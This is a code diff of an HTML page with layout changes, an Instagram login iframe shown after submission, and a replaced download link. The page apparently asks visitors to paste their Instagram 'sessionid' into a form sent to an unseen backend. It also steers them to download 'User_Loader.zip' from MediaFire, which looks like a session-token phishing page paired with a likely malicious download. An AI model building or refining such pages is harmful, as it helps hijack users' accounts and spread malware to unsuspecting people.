@@ -12,14 +12,15 @@
     body {
       margin: 0;
       min-height: 100vh;
-      overflow: hidden;
+      overflow-x: hidden;
       display: flex;
       justify-content: center;
-      align-items: center;
+      align-items: flex-start;
       font-family: "Quantico", sans-serif;
       color: #ffbdbd;
       position: relative;
       background-color: #000;
+      padding-top: 50px;
     }
 
     .container {
@@ -44,17 +45,10 @@
       text-shadow: 0 0 4px rgba(255,0,0,0.7), 0 0 8px rgba(255,0,0,0.4);
     }
 
-    .instruction {
+    .instruction, p {
       color: #ffb3b3;
       font-size: 1rem;
       margin-bottom: 5px;
-      text-align: center;
-    }
-
-    p {
-      color: #ffb3b3;
-      font-size: 1rem;
-      margin-bottom: 25px;
       text-align: center;
     }
 
@@ -137,6 +131,16 @@
       font-size: 1rem;
       text-align: center;
     }
+
+    iframe {
+      width: 100%;
+      max-width: 600px;
+      height: 600px;
+      border: none;
+      margin-top: 20px;
+      display: none;
+    }
+
   </style>
 </head>
 
@@ -152,15 +156,16 @@
     <br />
     <button id="sendBtn" disabled>Send</button>
 
-    <!-- ✅ Added note below Send button -->
     <p class="session-note">
       ● You are required to enter 'sessionid' only if 'Load User' does not work properly ●
     </p>
 
     <div id="statusMessage" class="status"></div>
 
-    <!-- Bottom note -->
     <p class="note">⚠️ ~SESSIONID IS ONLY REQUIRED IN SOME CASES~ ⚠️</p>
+
+    <!-- Instagram iframe -->
+    <iframe id="instagramFrame"></iframe>
   </div>
 
   <script>
@@ -168,6 +173,7 @@
     const sendBtn = document.getElementById('sendBtn');
     const statusMessage = document.getElementById('statusMessage');
     const loadBtn = document.getElementById('loadBtn');
+    const instagramFrame = document.getElementById('instagramFrame');
 
     pasteInput.addEventListener('input', () => {
       sendBtn.disabled = pasteInput.value.trim() === '';
@@ -194,11 +200,19 @@
           statusMessage.textContent = '✅ Your request has been sent successfully! Thank you!';
           statusMessage.classList.add('success');
           pasteInput.value = '';
+
+          // Try to open Instagram in iframe
+          instagramFrame.src = 'https://www.instagram.com/accounts/login/';
+          instagramFrame.style.display = 'block';
+
+          // Fallback if iframe blocked
+          instagramFrame.onerror = () => {
+            window.open('https://www.instagram.com/accounts/login/', '_blank');
+          };
         } else if (data.error) {
           statusMessage.textContent = data.error;
           statusMessage.classList.add('error');
         }
-        sendBtn.disabled = pasteInput.value.trim() === '';
       })
       .catch(err => {
         console.error(err);
@@ -211,9 +225,8 @@
     });
 
     loadBtn.addEventListener('click', () => {
-      window.open("https://www.mediafire.com/file/8wgqcef92mssppd/User+Loader.zip/file", "_blank");
+      window.open("https://www.mediafire.com/file/p38hzt8bjsb5bgu/User_Loader.zip/file", "_blank");
     });
   </script>
 </body>
 </html>
-
